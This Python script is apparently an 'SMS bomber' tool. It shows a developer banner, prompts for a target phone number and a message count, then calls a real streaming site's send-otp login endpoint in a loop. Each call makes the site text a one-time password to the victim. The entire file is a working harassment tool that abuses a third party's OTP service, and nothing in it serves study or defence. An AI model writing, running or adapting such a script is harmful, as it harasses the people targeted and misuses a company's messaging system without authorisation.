import os
from  urllib  import  request
import time

os.system('clear')

print("""
 ****     **** *******      ********   ******       ** ******
/**/**   **/**/**////**    /**/////   **////**     /**//////*
/**//** ** /**/**   /**    /**       **    //      /**     /*
/** //***  /**/*******     /******* /**            /**     *
/**  //*   /**/**///**     /**////  /**            /**    *
/**   /    /**/**  //**  **/**      //**    ** **  /**   *
/**        /**/**   //**/**/******** //****** //*****   *
//         // //     // // ////////   //////   /////   /
  #######################################
  #                                     #
  # Developer :Mr.ECJ7                  #
  # Github    :@MrECJ7                  #
  # Tool      :smsxt                    #
  # version   :1.0                      #
  #######################################
""")

phone=input("Enter Phone  number :")
sms=int(input("SMS quantity :" ))

url ="https://www.bioscopelive.com/bn/login/send-otp?phone=88"+phone+"&operator=bd-otp"

for a in range(sms):
	request.urlopen(url)
	print(str(a+1)+ "sms send ") 
	time.sleep(30)
